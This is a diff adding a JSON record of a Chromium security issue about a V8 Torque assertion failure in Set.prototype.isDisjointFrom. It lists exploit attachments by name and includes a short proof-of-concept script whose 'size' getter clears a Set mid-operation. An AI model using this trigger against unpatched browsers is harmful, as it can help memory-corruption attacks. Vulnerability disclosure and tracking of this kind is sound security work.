@@ -1,0 +1,73 @@
+{
+  "id": "40069798",
+  "url": "https://issues.chromium.org/issues/40069798",
+  "title": "Security: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed",
+  "status": "Assigned",
+  "severity": "S4-Minimal",
+  "priority": "P1",
+  "component": "Blink>JavaScript, Blink>JavaScript>Runtime",
+  "os_platforms": [
+    "Linux"
+  ],
+  "chrome_version": null,
+  "cve_ids": [],
+  "reporter": "ki...@gmail.com",
+  "assignee": "re...@chromium.org",
+  "created_date": "2023-08-17T13:26:55+00:00",
+  "modified_date": "2024-01-09T08:24:47+00:00",
+  "bounty_confirmed": true,
+  "bounty_amount": 15000.0,
+  "bounty_rationale": null,
+  "attachments": [
+    {
+      "id": 53419981,
+      "filename": "poc.js",
+      "mime_type": "text/plain",
+      "size_bytes": 163,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53419981?download=true",
+      "local_path": "attachments/poc.js"
+    },
+    {
+      "id": 53420035,
+      "filename": "poc.js",
+      "mime_type": "text/plain",
+      "size_bytes": 163,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53420035?download=true",
+      "local_path": "attachments/poc.js"
+    },
+    {
+      "id": 53420175,
+      "filename": "demo.png",
+      "mime_type": "image/png",
+      "size_bytes": 285480,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53420175?download=true",
+      "local_path": "attachments/demo.png"
+    },
+    {
+      "id": 53420176,
+      "filename": "exp.js",
+      "mime_type": "text/plain",
+      "size_bytes": 2644,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53420176?download=true",
+      "local_path": "attachments/exp.js"
+    },
+    {
+      "id": 53420217,
+      "filename": "exploit.mp4",
+      "mime_type": "video/mp4",
+      "size_bytes": 1024008,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53420217?download=true",
+      "local_path": "attachments/exploit.mp4"
+    },
+    {
+      "id": 53420218,
+      "filename": "exploit.js",
+      "mime_type": "text/plain",
+      "size_bytes": 7891,
+      "url": "https://issues.chromium.org/action/issues/40069798/attachments/53420218?download=true",
+      "local_path": "attachments/exploit.js"
+    }
+  ],
+  "update_count": 53,
+  "description_snippet": "VULNERABILITY DETAILS\n## PoC\n```\nconst v0 = new Set();\nconst v1 = new Set();\nObject.defineProperty(v1, \"size\", {\n  get: function () {\n    v0.clear();\n    return 1;\n  },\n\n});\nv0.isDisjointFrom(v1);\n```\n\n## INTRODUCE\nAfter bisect, it was determined that following commit caused this problem.\n\n- Commit"
+}
